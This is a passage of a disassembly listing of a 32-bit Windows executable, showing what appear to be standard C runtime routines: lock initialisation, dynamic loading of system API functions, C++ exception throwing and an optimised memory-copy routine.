  403767:	56                   	push   %esi
  403768:	57                   	push   %edi
  403769:	bf 68 4b 41 00       	mov    $0x414b68,%edi
  40376e:	33 f6                	xor    %esi,%esi
  403770:	6a 00                	push   $0x0
  403772:	68 a0 0f 00 00       	push   $0xfa0
  403777:	57                   	push   %edi
  403778:	e8 2f 02 00 00       	call   0x4039ac
  40377d:	83 c4 0c             	add    $0xc,%esp
  403780:	85 c0                	test   %eax,%eax
  403782:	74 15                	je     0x403799
  403784:	ff 05 80 4b 41 00    	incl   0x414b80
  40378a:	83 c6 18             	add    $0x18,%esi
  40378d:	83 c7 18             	add    $0x18,%edi
  403790:	83 fe 18             	cmp    $0x18,%esi
  403793:	72 db                	jb     0x403770
  403795:	b0 01                	mov    $0x1,%al
  403797:	eb 07                	jmp    0x4037a0
  403799:	e8 05 00 00 00       	call   0x4037a3
  40379e:	32 c0                	xor    %al,%al
  4037a0:	5f                   	pop    %edi
  4037a1:	5e                   	pop    %esi
  4037a2:	c3                   	ret
  4037a3:	56                   	push   %esi
  4037a4:	8b 35 80 4b 41 00    	mov    0x414b80,%esi
  4037aa:	85 f6                	test   %esi,%esi
  4037ac:	74 20                	je     0x4037ce
  4037ae:	6b c6 18             	imul   $0x18,%esi,%eax
  4037b1:	57                   	push   %edi
  4037b2:	8d b8 50 4b 41 00    	lea    0x414b50(%eax),%edi
  4037b8:	57                   	push   %edi
  4037b9:	ff 15 88 d0 40 00    	call   *0x40d088
  4037bf:	ff 0d 80 4b 41 00    	decl   0x414b80
  4037c5:	83 ef 18             	sub    $0x18,%edi
  4037c8:	83 ee 01             	sub    $0x1,%esi
  4037cb:	75 eb                	jne    0x4037b8
  4037cd:	5f                   	pop    %edi
  4037ce:	b0 01                	mov    $0x1,%al
  4037d0:	5e                   	pop    %esi
  4037d1:	c3                   	ret
  4037d2:	55                   	push   %ebp
  4037d3:	8b ec                	mov    %esp,%ebp
  4037d5:	51                   	push   %ecx
  4037d6:	51                   	push   %ecx
  4037d7:	8b 45 08             	mov    0x8(%ebp),%eax
  4037da:	57                   	push   %edi
  4037db:	8d 04 85 cc 4b 41 00 	lea    0x414bcc(,%eax,4),%eax
  4037e2:	89 45 f8             	mov    %eax,-0x8(%ebp)
  4037e5:	8b 00                	mov    (%eax),%eax
  4037e7:	90                   	nop
  4037e8:	83 cf ff             	or     $0xffffffff,%edi
  4037eb:	3b c7                	cmp    %edi,%eax
  4037ed:	75 04                	jne    0x4037f3
  4037ef:	33 c0                	xor    %eax,%eax
  4037f1:	eb 56                	jmp    0x403849
  4037f3:	85 c0                	test   %eax,%eax
  4037f5:	75 52                	jne    0x403849
  4037f7:	53                   	push   %ebx
  4037f8:	8b 5d 10             	mov    0x10(%ebp),%ebx
  4037fb:	56                   	push   %esi
  4037fc:	eb 3d                	jmp    0x40383b
  4037fe:	8b 0b                	mov    (%ebx),%ecx
  403800:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  403803:	8d 04 8d c0 4b 41 00 	lea    0x414bc0(,%ecx,4),%eax
  40380a:	8b 30                	mov    (%eax),%esi
  40380c:	90                   	nop
  40380d:	85 f6                	test   %esi,%esi
  40380f:	74 06                	je     0x403817
  403811:	3b f7                	cmp    %edi,%esi
  403813:	75 46                	jne    0x40385b
  403815:	eb 21                	jmp    0x403838
  403817:	ff 34 8d 8c db 40 00 	push   0x40db8c(,%ecx,4)
  40381e:	e8 4f 00 00 00       	call   0x403872
  403823:	8b 55 fc             	mov    -0x4(%ebp),%edx
  403826:	8b f0                	mov    %eax,%esi
  403828:	59                   	pop    %ecx
  403829:	8d 0c 95 c0 4b 41 00 	lea    0x414bc0(,%edx,4),%ecx
  403830:	85 f6                	test   %esi,%esi
  403832:	75 18                	jne    0x40384c
  403834:	8b c7                	mov    %edi,%eax
  403836:	87 01                	xchg   %eax,(%ecx)
  403838:	83 c3 04             	add    $0x4,%ebx
  40383b:	3b 5d 14             	cmp    0x14(%ebp),%ebx
  40383e:	75 be                	jne    0x4037fe
  403840:	8b 55 f8             	mov    -0x8(%ebp),%edx
  403843:	87 3a                	xchg   %edi,(%edx)
  403845:	33 c0                	xor    %eax,%eax
  403847:	5e                   	pop    %esi
  403848:	5b                   	pop    %ebx
  403849:	5f                   	pop    %edi
  40384a:	c9                   	leave
  40384b:	c3                   	ret
  40384c:	8b c6                	mov    %esi,%eax
  40384e:	87 01                	xchg   %eax,(%ecx)
  403850:	85 c0                	test   %eax,%eax
  403852:	74 07                	je     0x40385b
  403854:	56                   	push   %esi
  403855:	ff 15 a0 d0 40 00    	call   *0x40d0a0
  40385b:	ff 75 0c             	push   0xc(%ebp)
  40385e:	56                   	push   %esi
  40385f:	ff 15 1c d0 40 00    	call   *0x40d01c
  403865:	85 c0                	test   %eax,%eax
  403867:	74 d7                	je     0x403840
  403869:	8b 55 f8             	mov    -0x8(%ebp),%edx
  40386c:	8b c8                	mov    %eax,%ecx
  40386e:	87 0a                	xchg   %ecx,(%edx)
  403870:	eb d5                	jmp    0x403847
  403872:	55                   	push   %ebp
  403873:	8b ec                	mov    %esp,%ebp
  403875:	68 00 08 00 00       	push   $0x800
  40387a:	6a 00                	push   $0x0
  40387c:	ff 75 08             	push   0x8(%ebp)
  40387f:	ff 15 a4 d0 40 00    	call   *0x40d0a4
  403885:	85 c0                	test   %eax,%eax
  403887:	75 32                	jne    0x4038bb
  403889:	ff 15 74 d0 40 00    	call   *0x40d074
  40388f:	83 f8 57             	cmp    $0x57,%eax
  403892:	75 25                	jne    0x4038b9
  403894:	6a 07                	push   $0x7
  403896:	68 10 dc 40 00       	push   $0x40dc10
  40389b:	ff 75 08             	push   0x8(%ebp)
  40389e:	e8 d5 1b 00 00       	call   0x405478
  4038a3:	83 c4 0c             	add    $0xc,%esp
  4038a6:	85 c0                	test   %eax,%eax
  4038a8:	74 0f                	je     0x4038b9
  4038aa:	6a 00                	push   $0x0
  4038ac:	6a 00                	push   $0x0
  4038ae:	ff 75 08             	push   0x8(%ebp)
  4038b1:	ff 15 a4 d0 40 00    	call   *0x40d0a4
  4038b7:	5d                   	pop    %ebp
  4038b8:	c3                   	ret
  4038b9:	33 c0                	xor    %eax,%eax
  4038bb:	5d                   	pop    %ebp
  4038bc:	c3                   	ret
  4038bd:	55                   	push   %ebp
  4038be:	8b ec                	mov    %esp,%ebp
  4038c0:	56                   	push   %esi
  4038c1:	68 28 dc 40 00       	push   $0x40dc28
  4038c6:	68 20 dc 40 00       	push   $0x40dc20
  4038cb:	68 28 dc 40 00       	push   $0x40dc28
  4038d0:	6a 00                	push   $0x0
  4038d2:	e8 fb fe ff ff       	call   0x4037d2
  4038d7:	8b f0                	mov    %eax,%esi
  4038d9:	83 c4 10             	add    $0x10,%esp
  4038dc:	85 f6                	test   %esi,%esi
  4038de:	74 10                	je     0x4038f0
  4038e0:	ff 75 08             	push   0x8(%ebp)
  4038e3:	8b ce                	mov    %esi,%ecx
  4038e5:	ff 15 3c d1 40 00    	call   *0x40d13c
  4038eb:	ff d6                	call   *%esi
  4038ed:	5e                   	pop    %esi
  4038ee:	5d                   	pop    %ebp
  4038ef:	c3                   	ret
  4038f0:	5e                   	pop    %esi
  4038f1:	5d                   	pop    %ebp
  4038f2:	ff 25 90 d0 40 00    	jmp    *0x40d090
  4038f8:	55                   	push   %ebp
  4038f9:	8b ec                	mov    %esp,%ebp
  4038fb:	56                   	push   %esi
  4038fc:	68 3c dc 40 00       	push   $0x40dc3c
  403901:	68 34 dc 40 00       	push   $0x40dc34
  403906:	68 3c dc 40 00       	push   $0x40dc3c
  40390b:	6a 01                	push   $0x1
  40390d:	e8 c0 fe ff ff       	call   0x4037d2
  403912:	83 c4 10             	add    $0x10,%esp
  403915:	8b f0                	mov    %eax,%esi
  403917:	ff 75 08             	push   0x8(%ebp)
  40391a:	85 f6                	test   %esi,%esi
  40391c:	74 0c                	je     0x40392a
  40391e:	8b ce                	mov    %esi,%ecx
  403920:	ff 15 3c d1 40 00    	call   *0x40d13c
  403926:	ff d6                	call   *%esi
  403928:	eb 06                	jmp    0x403930
  40392a:	ff 15 9c d0 40 00    	call   *0x40d09c
  403930:	5e                   	pop    %esi
  403931:	5d                   	pop    %ebp
  403932:	c3                   	ret
  403933:	55                   	push   %ebp
  403934:	8b ec                	mov    %esp,%ebp
  403936:	56                   	push   %esi
  403937:	68 4c dc 40 00       	push   $0x40dc4c
  40393c:	68 44 dc 40 00       	push   $0x40dc44
  403941:	68 4c dc 40 00       	push   $0x40dc4c
  403946:	6a 02                	push   $0x2
  403948:	e8 85 fe ff ff       	call   0x4037d2
  40394d:	83 c4 10             	add    $0x10,%esp
  403950:	8b f0                	mov    %eax,%esi
  403952:	ff 75 08             	push   0x8(%ebp)
  403955:	85 f6                	test   %esi,%esi
  403957:	74 0c                	je     0x403965
  403959:	8b ce                	mov    %esi,%ecx
  40395b:	ff 15 3c d1 40 00    	call   *0x40d13c
  403961:	ff d6                	call   *%esi
  403963:	eb 06                	jmp    0x40396b
  403965:	ff 15 94 d0 40 00    	call   *0x40d094
  40396b:	5e                   	pop    %esi
  40396c:	5d                   	pop    %ebp
  40396d:	c3                   	ret
  40396e:	55                   	push   %ebp
  40396f:	8b ec                	mov    %esp,%ebp
  403971:	56                   	push   %esi
  403972:	68 60 dc 40 00       	push   $0x40dc60
  403977:	68 58 dc 40 00       	push   $0x40dc58
  40397c:	68 60 dc 40 00       	push   $0x40dc60
  403981:	6a 03                	push   $0x3
  403983:	e8 4a fe ff ff       	call   0x4037d2
  403988:	83 c4 10             	add    $0x10,%esp
  40398b:	8b f0                	mov    %eax,%esi
  40398d:	ff 75 0c             	push   0xc(%ebp)
  403990:	ff 75 08             	push   0x8(%ebp)
  403993:	85 f6                	test   %esi,%esi
  403995:	74 0c                	je     0x4039a3
  403997:	8b ce                	mov    %esi,%ecx
  403999:	ff 15 3c d1 40 00    	call   *0x40d13c
  40399f:	ff d6                	call   *%esi
  4039a1:	eb 06                	jmp    0x4039a9
  4039a3:	ff 15 98 d0 40 00    	call   *0x40d098
  4039a9:	5e                   	pop    %esi
  4039aa:	5d                   	pop    %ebp
  4039ab:	c3                   	ret
  4039ac:	55                   	push   %ebp
  4039ad:	8b ec                	mov    %esp,%ebp
  4039af:	56                   	push   %esi
  4039b0:	68 74 dc 40 00       	push   $0x40dc74
  4039b5:	68 6c dc 40 00       	push   $0x40dc6c
  4039ba:	68 74 dc 40 00       	push   $0x40dc74
  4039bf:	6a 04                	push   $0x4
  4039c1:	e8 0c fe ff ff       	call   0x4037d2
  4039c6:	8b f0                	mov    %eax,%esi
  4039c8:	83 c4 10             	add    $0x10,%esp
  4039cb:	85 f6                	test   %esi,%esi
  4039cd:	74 15                	je     0x4039e4
  4039cf:	ff 75 10             	push   0x10(%ebp)
  4039d2:	8b ce                	mov    %esi,%ecx
  4039d4:	ff 75 0c             	push   0xc(%ebp)
  4039d7:	ff 75 08             	push   0x8(%ebp)
  4039da:	ff 15 3c d1 40 00    	call   *0x40d13c
  4039e0:	ff d6                	call   *%esi
  4039e2:	eb 0c                	jmp    0x4039f0
  4039e4:	ff 75 0c             	push   0xc(%ebp)
  4039e7:	ff 75 08             	push   0x8(%ebp)
  4039ea:	ff 15 8c d0 40 00    	call   *0x40d08c
  4039f0:	5e                   	pop    %esi
  4039f1:	5d                   	pop    %ebp
  4039f2:	c3                   	ret
  4039f3:	56                   	push   %esi
  4039f4:	e8 ed ec ff ff       	call   0x4026e6
  4039f9:	8b 70 04             	mov    0x4(%eax),%esi
  4039fc:	85 f6                	test   %esi,%esi
  4039fe:	74 0a                	je     0x403a0a
  403a00:	8b ce                	mov    %esi,%ecx
  403a02:	ff 15 3c d1 40 00    	call   *0x40d13c
  403a08:	ff d6                	call   *%esi
  403a0a:	e8 7a 18 00 00       	call   0x405289
  403a0f:	cc                   	int3
  403a10:	55                   	push   %ebp
  403a11:	8b ec                	mov    %esp,%ebp
  403a13:	8b 45 10             	mov    0x10(%ebp),%eax
  403a16:	8b 4d 08             	mov    0x8(%ebp),%ecx
  403a19:	81 78 04 80 00 00 00 	cmpl   $0x80,0x4(%eax)
  403a20:	7f 06                	jg     0x403a28
  403a22:	0f be 41 08          	movsbl 0x8(%ecx),%eax
  403a26:	5d                   	pop    %ebp
  403a27:	c3                   	ret
  403a28:	8b 41 08             	mov    0x8(%ecx),%eax
  403a2b:	5d                   	pop    %ebp
  403a2c:	c3                   	ret
  403a2d:	55                   	push   %ebp
  403a2e:	8b ec                	mov    %esp,%ebp
  403a30:	8b 45 08             	mov    0x8(%ebp),%eax
  403a33:	8b 4d 10             	mov    0x10(%ebp),%ecx
  403a36:	89 48 08             	mov    %ecx,0x8(%eax)
  403a39:	5d                   	pop    %ebp
  403a3a:	c3                   	ret
  403a3b:	55                   	push   %ebp
  403a3c:	8b ec                	mov    %esp,%ebp
  403a3e:	57                   	push   %edi
  403a3f:	8b 7d 08             	mov    0x8(%ebp),%edi
  403a42:	80 7f 04 00          	cmpb   $0x0,0x4(%edi)
  403a46:	74 48                	je     0x403a90
  403a48:	8b 0f                	mov    (%edi),%ecx
  403a4a:	85 c9                	test   %ecx,%ecx
  403a4c:	74 42                	je     0x403a90
  403a4e:	8d 51 01             	lea    0x1(%ecx),%edx
  403a51:	8a 01                	mov    (%ecx),%al
  403a53:	41                   	inc    %ecx
  403a54:	84 c0                	test   %al,%al
  403a56:	75 f9                	jne    0x403a51
  403a58:	2b ca                	sub    %edx,%ecx
  403a5a:	53                   	push   %ebx
  403a5b:	56                   	push   %esi
  403a5c:	8d 59 01             	lea    0x1(%ecx),%ebx
  403a5f:	53                   	push   %ebx
  403a60:	e8 a8 18 00 00       	call   0x40530d
  403a65:	8b f0                	mov    %eax,%esi
  403a67:	59                   	pop    %ecx
  403a68:	85 f6                	test   %esi,%esi
  403a6a:	74 19                	je     0x403a85
  403a6c:	ff 37                	push   (%edi)
  403a6e:	53                   	push   %ebx
  403a6f:	56                   	push   %esi
  403a70:	e8 a3 18 00 00       	call   0x405318
  403a75:	8b 45 0c             	mov    0xc(%ebp),%eax
  403a78:	8b ce                	mov    %esi,%ecx
  403a7a:	83 c4 0c             	add    $0xc,%esp
  403a7d:	33 f6                	xor    %esi,%esi
  403a7f:	89 08                	mov    %ecx,(%eax)
  403a81:	c6 40 04 01          	movb   $0x1,0x4(%eax)
  403a85:	56                   	push   %esi
  403a86:	e8 7d 18 00 00       	call   0x405308
  403a8b:	59                   	pop    %ecx
  403a8c:	5e                   	pop    %esi
  403a8d:	5b                   	pop    %ebx
  403a8e:	eb 0b                	jmp    0x403a9b
  403a90:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  403a93:	8b 07                	mov    (%edi),%eax
  403a95:	89 01                	mov    %eax,(%ecx)
  403a97:	c6 41 04 00          	movb   $0x0,0x4(%ecx)
  403a9b:	5f                   	pop    %edi
  403a9c:	5d                   	pop    %ebp
  403a9d:	c3                   	ret
  403a9e:	55                   	push   %ebp
  403a9f:	8b ec                	mov    %esp,%ebp
  403aa1:	56                   	push   %esi
  403aa2:	8b 75 08             	mov    0x8(%ebp),%esi
  403aa5:	80 7e 04 00          	cmpb   $0x0,0x4(%esi)
  403aa9:	74 08                	je     0x403ab3
  403aab:	ff 36                	push   (%esi)
  403aad:	e8 56 18 00 00       	call   0x405308
  403ab2:	59                   	pop    %ecx
  403ab3:	83 26 00             	andl   $0x0,(%esi)
  403ab6:	c6 46 04 00          	movb   $0x0,0x4(%esi)
  403aba:	5e                   	pop    %esi
  403abb:	5d                   	pop    %ebp
  403abc:	c3                   	ret
  403abd:	55                   	push   %ebp
  403abe:	8b ec                	mov    %esp,%ebp
  403ac0:	83 ec 14             	sub    $0x14,%esp
  403ac3:	8b 45 08             	mov    0x8(%ebp),%eax
  403ac6:	53                   	push   %ebx
  403ac7:	57                   	push   %edi
  403ac8:	8b 7d 0c             	mov    0xc(%ebp),%edi
  403acb:	bb 20 05 93 19       	mov    $0x19930520,%ebx
  403ad0:	89 45 f0             	mov    %eax,-0x10(%ebp)
  403ad3:	85 ff                	test   %edi,%edi
  403ad5:	74 2d                	je     0x403b04
  403ad7:	f6 07 10             	testb  $0x10,(%edi)
  403ada:	74 1e                	je     0x403afa
  403adc:	8b 08                	mov    (%eax),%ecx
  403ade:	83 e9 04             	sub    $0x4,%ecx
  403ae1:	56                   	push   %esi
  403ae2:	51                   	push   %ecx
  403ae3:	8b 01                	mov    (%ecx),%eax
  403ae5:	8b 70 20             	mov    0x20(%eax),%esi
  403ae8:	8b ce                	mov    %esi,%ecx
  403aea:	8b 78 18             	mov    0x18(%eax),%edi
  403aed:	ff 15 3c d1 40 00    	call   *0x40d13c
  403af3:	ff d6                	call   *%esi
  403af5:	5e                   	pop    %esi
  403af6:	85 ff                	test   %edi,%edi
  403af8:	74 0a                	je     0x403b04
  403afa:	f6 07 08             	testb  $0x8,(%edi)
  403afd:	74 05                	je     0x403b04
  403aff:	bb 00 40 99 01       	mov    $0x1994000,%ebx
  403b04:	8b 45 f0             	mov    -0x10(%ebp),%eax
  403b07:	89 45 f8             	mov    %eax,-0x8(%ebp)
  403b0a:	8d 45 f4             	lea    -0xc(%ebp),%eax
  403b0d:	50                   	push   %eax
  403b0e:	6a 03                	push   $0x3
  403b10:	6a 01                	push   $0x1
  403b12:	68 63 73 6d e0       	push   $0xe06d7363
  403b17:	89 5d f4             	mov    %ebx,-0xc(%ebp)
  403b1a:	89 7d fc             	mov    %edi,-0x4(%ebp)
  403b1d:	ff 15 a8 d0 40 00    	call   *0x40d0a8
  403b23:	5f                   	pop    %edi
  403b24:	5b                   	pop    %ebx
  403b25:	c9                   	leave
  403b26:	c2 08 00             	ret    $0x8
  403b29:	cc                   	int3
  403b2a:	cc                   	int3
  403b2b:	cc                   	int3
  403b2c:	cc                   	int3
  403b2d:	cc                   	int3
  403b2e:	cc                   	int3
  403b2f:	cc                   	int3
  403b30:	57                   	push   %edi
  403b31:	56                   	push   %esi
  403b32:	8b 74 24 10          	mov    0x10(%esp),%esi
  403b36:	8b 4c 24 14          	mov    0x14(%esp),%ecx
  403b3a:	8b 7c 24 0c          	mov    0xc(%esp),%edi
  403b3e:	8b c1                	mov    %ecx,%eax
  403b40:	8b d1                	mov    %ecx,%edx
  403b42:	03 c6                	add    %esi,%eax
  403b44:	3b fe                	cmp    %esi,%edi
  403b46:	76 08                	jbe    0x403b50
  403b48:	3b f8                	cmp    %eax,%edi
  403b4a:	0f 82 94 02 00 00    	jb     0x403de4
  403b50:	83 f9 20             	cmp    $0x20,%ecx
  403b53:	0f 82 d2 04 00 00    	jb     0x40402b
  403b59:	81 f9 80 00 00 00    	cmp    $0x80,%ecx
  403b5f:	73 13                	jae    0x403b74
  403b61:	0f ba 25 10 40 41 00 	btl    $0x1,0x414010
  403b68:	01 
  403b69:	0f 82 8e 04 00 00    	jb     0x403ffd
  403b6f:	e9 e3 01 00 00       	jmp    0x403d57
  403b74:	0f ba 25 38 4b 41 00 	btl    $0x1,0x414b38
  403b7b:	01 
  403b7c:	73 09                	jae    0x403b87
  403b7e:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
  403b80:	8b 44 24 0c          	mov    0xc(%esp),%eax
  403b84:	5e                   	pop    %esi
  403b85:	5f                   	pop    %edi
  403b86:	c3                   	ret
  403b87:	8b c7                	mov    %edi,%eax
  403b89:	33 c6                	xor    %esi,%eax
  403b8b:	a9 0f 00 00 00       	test   $0xf,%eax
  403b90:	75 0e                	jne    0x403ba0
  403b92:	0f ba 25 10 40 41 00 	btl    $0x1,0x414010
  403b99:	01 
  403b9a:	0f 82 e0 03 00 00    	jb     0x403f80
  403ba0:	0f ba 25 38 4b 41 00 	btl    $0x0,0x414b38
  403ba7:	00 
  403ba8:	0f 83 a9 01 00 00    	jae    0x403d57
  403bae:	f7 c7 03 00 00 00    	test   $0x3,%edi
  403bb4:	0f 85 9d 01 00 00    	jne    0x403d57
  403bba:	f7 c6 03 00 00 00    	test   $0x3,%esi
  403bc0:	0f 85 ac 01 00 00    	jne    0x403d72
  403bc6:	0f ba e7 02          	bt     $0x2,%edi
  403bca:	73 0d                	jae    0x403bd9
  403bcc:	8b 06                	mov    (%esi),%eax
  403bce:	83 e9 04             	sub    $0x4,%ecx
  403bd1:	8d 76 04             	lea    0x4(%esi),%esi
  403bd4:	89 07                	mov    %eax,(%edi)
  403bd6:	8d 7f 04             	lea    0x4(%edi),%edi
  403bd9:	0f ba e7 03          	bt     $0x3,%edi
  403bdd:	73 11                	jae    0x403bf0
  403bdf:	f3 0f 7e 0e          	movq   (%esi),%xmm1
  403be3:	83 e9 08             	sub    $0x8,%ecx
  403be6:	8d 76 08             	lea    0x8(%esi),%esi
  403be9:	66 0f d6 0f          	movq   %xmm1,(%edi)
  403bed:	8d 7f 08             	lea    0x8(%edi),%edi
  403bf0:	f7 c6 07 00 00 00    	test   $0x7,%esi
  403bf6:	74 65                	je     0x403c5d
  403bf8:	0f ba e6 03          	bt     $0x3,%esi
  403bfc:	0f 83 b4 00 00 00    	jae    0x403cb6
  403c02:	66 0f 6f 4e f4       	movdqa -0xc(%esi),%xmm1
  403c07:	8d 76 f4             	lea    -0xc(%esi),%esi
  403c0a:	8b ff                	mov    %edi,%edi
  403c0c:	66 0f 6f 5e 10       	movdqa 0x10(%esi),%xmm3
  403c11:	83 e9 30             	sub    $0x30,%ecx
  403c14:	66 0f 6f 46 20       	movdqa 0x20(%esi),%xmm0
  403c19:	66 0f 6f 6e 30       	movdqa 0x30(%esi),%xmm5
  403c1e:	8d 76 30             	lea    0x30(%esi),%esi
  403c21:	83 f9 30             	cmp    $0x30,%ecx
  403c24:	66 0f 6f d3          	movdqa %xmm3,%xmm2
  403c28:	66 0f 3a 0f d9 0c    	palignr $0xc,%xmm1,%xmm3
  403c2e:	66 0f 7f 1f          	movdqa %xmm3,(%edi)
  403c32:	66 0f 6f e0          	movdqa %xmm0,%xmm4
  403c36:	66 0f 3a 0f c2 0c    	palignr $0xc,%xmm2,%xmm0
  403c3c:	66 0f 7f 47 10       	movdqa %xmm0,0x10(%edi)
  403c41:	66 0f 6f cd          	movdqa %xmm5,%xmm1
  403c45:	66 0f 3a 0f ec 0c    	palignr $0xc,%xmm4,%xmm5
  403c4b:	66 0f 7f 6f 20       	movdqa %xmm5,0x20(%edi)
  403c50:	8d 7f 30             	lea    0x30(%edi),%edi
  403c53:	73 b7                	jae    0x403c0c
  403c55:	8d 76 0c             	lea    0xc(%esi),%esi
  403c58:	e9 af 00 00 00       	jmp    0x403d0c
  403c5d:	66 0f 6f 4e f8       	movdqa -0x8(%esi),%xmm1
  403c62:	8d 76 f8             	lea    -0x8(%esi),%esi
  403c65:	8d 49 00             	lea    0x0(%ecx),%ecx
  403c68:	66 0f 6f 5e 10       	movdqa 0x10(%esi),%xmm3
  403c6d:	83 e9 30             	sub    $0x30,%ecx
  403c70:	66 0f 6f 46 20       	movdqa 0x20(%esi),%xmm0
  403c75:	66 0f 6f 6e 30       	movdqa 0x30(%esi),%xmm5
  403c7a:	8d 76 30             	lea    0x30(%esi),%esi
  403c7d:	83 f9 30             	cmp    $0x30,%ecx
  403c80:	66 0f 6f d3          	movdqa %xmm3,%xmm2
  403c84:	66 0f 3a 0f d9 08    	palignr $0x8,%xmm1,%xmm3
  403c8a:	66 0f 7f 1f          	movdqa %xmm3,(%edi)
  403c8e:	66 0f 6f e0          	movdqa %xmm0,%xmm4
  403c92:	66 0f 3a 0f c2 08    	palignr $0x8,%xmm2,%xmm0
  403c98:	66 0f 7f 47 10       	movdqa %xmm0,0x10(%edi)
  403c9d:	66 0f 6f cd          	movdqa %xmm5,%xmm1
  403ca1:	66 0f 3a 0f ec 08    	palignr $0x8,%xmm4,%xmm5
  403ca7:	66 0f 7f 6f 20       	movdqa %xmm5,0x20(%edi)
  403cac:	8d 7f 30             	lea    0x30(%edi),%edi
  403caf:	73 b7                	jae    0x403c68
  403cb1:	8d 76 08             	lea    0x8(%esi),%esi
  403cb4:	eb 56                	jmp    0x403d0c
  403cb6:	66 0f 6f 4e fc       	movdqa -0x4(%esi),%xmm1
  403cbb:	8d 76 fc             	lea    -0x4(%esi),%esi
  403cbe:	8b ff                	mov    %edi,%edi
  403cc0:	66 0f 6f 5e 10       	movdqa 0x10(%esi),%xmm3
  403cc5:	83 e9 30             	sub    $0x30,%ecx
  403cc8:	66 0f 6f 46 20       	movdqa 0x20(%esi),%xmm0
  403ccd:	66 0f 6f 6e 30       	movdqa 0x30(%esi),%xmm5
  403cd2:	8d 76 30             	lea    0x30(%esi),%esi
  403cd5:	83 f9 30             	cmp    $0x30,%ecx
  403cd8:	66 0f 6f d3          	movdqa %xmm3,%xmm2
  403cdc:	66 0f 3a 0f d9 04    	palignr $0x4,%xmm1,%xmm3
  403ce2:	66 0f 7f 1f          	movdqa %xmm3,(%edi)
  403ce6:	66 0f 6f e0          	movdqa %xmm0,%xmm4
  403cea:	66 0f 3a 0f c2 04    	palignr $0x4,%xmm2,%xmm0
  403cf0:	66 0f 7f 47 10       	movdqa %xmm0,0x10(%edi)
  403cf5:	66 0f 6f cd          	movdqa %xmm5,%xmm1
  403cf9:	66 0f 3a 0f ec 04    	palignr $0x4,%xmm4,%xmm5
  403cff:	66 0f 7f 6f 20       	movdqa %xmm5,0x20(%edi)
  403d04:	8d 7f 30             	lea    0x30(%edi),%edi
  403d07:	73 b7                	jae    0x403cc0
  403d09:	8d 76 04             	lea    0x4(%esi),%esi
  403d0c:	83 f9 10             	cmp    $0x10,%ecx
  403d0f:	72 13                	jb     0x403d24
  403d11:	f3 0f 6f 0e          	movdqu (%esi),%xmm1
  403d15:	83 e9 10             	sub    $0x10,%ecx
  403d18:	8d 76 10             	lea    0x10(%esi),%esi
  403d1b:	66 0f 7f 0f          	movdqa %xmm1,(%edi)
  403d1f:	8d 7f 10             	lea    0x10(%edi),%edi
  403d22:	eb e8                	jmp    0x403d0c
  403d24:	0f ba e1 02          	bt     $0x2,%ecx
  403d28:	73 0d                	jae    0x403d37
  403d2a:	8b 06                	mov    (%esi),%eax
  403d2c:	83 e9 04             	sub    $0x4,%ecx
  403d2f:	8d 76 04             	lea    0x4(%esi),%esi
  403d32:	89 07                	mov    %eax,(%edi)
  403d34:	8d 7f 04             	lea    0x4(%edi),%edi
  403d37:	0f ba e1 03          	bt     $0x3,%ecx
  403d3b:	73 11                	jae    0x403d4e
  403d3d:	f3 0f 7e 0e          	movq   (%esi),%xmm1
  403d41:	83 e9 08             	sub    $0x8,%ecx
  403d44:	8d 76 08             	lea    0x8(%esi),%esi
  403d47:	66 0f d6 0f          	movq   %xmm1,(%edi)
  403d4b:	8d 7f 08             	lea    0x8(%edi),%edi
  403d4e:	8b 04 8d 94 3d 40 00 	mov    0x403d94(,%ecx,4),%eax
  403d55:	ff e0                	jmp    *%eax
  403d57:	f7 c7 03 00 00 00    	test   $0x3,%edi
  403d5d:	74 13                	je     0x403d72
  403d5f:	8a 06                	mov    (%esi),%al
  403d61:	88 07                	mov    %al,(%edi)
  403d63:	49                   	dec    %ecx
  403d64:	83 c6 01             	add    $0x1,%esi
  403d67:	83 c7 01             	add    $0x1,%edi
  403d6a:	f7 c7 03 00 00 00    	test   $0x3,%edi
  403d70:	75 ed                	jne    0x403d5f
  403d72:	8b d1                	mov    %ecx,%edx
  403d74:	83 f9 20             	cmp    $0x20,%ecx
  403d77:	0f 82 ae 02 00 00    	jb     0x40402b
  403d7d:	c1 e9 02             	shr    $0x2,%ecx
  403d80:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  403d82:	83 e2 03             	and    $0x3,%edx
  403d85:	ff 24 95 94 3d 40 00 	jmp    *0x403d94(,%edx,4)
  403d8c:	ff 24 8d a4 3d 40 00 	jmp    *0x403da4(,%ecx,4)
  403d93:	90                   	nop
  403d94:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  403d95:	3d 40 00 ac 3d       	cmp    $0x3dac0040,%eax
  403d9a:	40                   	inc    %eax
  403d9b:	00 b8 3d 40 00 cc    	add    %bh,-0x33ffbfc3(%eax)
  403da1:	3d 40 00 8b 44       	cmp    $0x448b0040,%eax
  403da6:	24 0c                	and    $0xc,%al
  403da8:	5e                   	pop    %esi
  403da9:	5f                   	pop    %edi
  403daa:	c3                   	ret
  403dab:	90                   	nop
  403dac:	8a 06                	mov    (%esi),%al
  403dae:	88 07                	mov    %al,(%edi)
  403db0:	8b 44 24 0c          	mov    0xc(%esp),%eax
  403db4:	5e                   	pop    %esi
  403db5:	5f                   	pop    %edi
  403db6:	c3                   	ret
  403db7:	90                   	nop
  403db8:	8a 06                	mov    (%esi),%al
  403dba:	88 07                	mov    %al,(%edi)
  403dbc:	8a 46 01             	mov    0x1(%esi),%al
  403dbf:	88 47 01             	mov    %al,0x1(%edi)
  403dc2:	8b 44 24 0c          	mov    0xc(%esp),%eax
  403dc6:	5e                   	pop    %esi
  403dc7:	5f                   	pop    %edi
  403dc8:	c3                   	ret
  403dc9:	8d 49 00             	lea    0x0(%ecx),%ecx
  403dcc:	8a 06                	mov    (%esi),%al
  403dce:	88 07                	mov    %al,(%edi)
  403dd0:	8a 46 01             	mov    0x1(%esi),%al
  403dd3:	88 47 01             	mov    %al,0x1(%edi)
  403dd6:	8a 46 02             	mov    0x2(%esi),%al
  403dd9:	88 47 02             	mov    %al,0x2(%edi)
  403ddc:	8b 44 24 0c          	mov    0xc(%esp),%eax
  403de0:	5e                   	pop    %esi
  403de1:	5f                   	pop    %edi
  403de2:	c3                   	ret
  403de3:	90                   	nop
  403de4:	8d 34 0e             	lea    (%esi,%ecx,1),%esi
  403de7:	8d 3c 0f             	lea    (%edi,%ecx,1),%edi
  403dea:	83 f9 20             	cmp    $0x20,%ecx
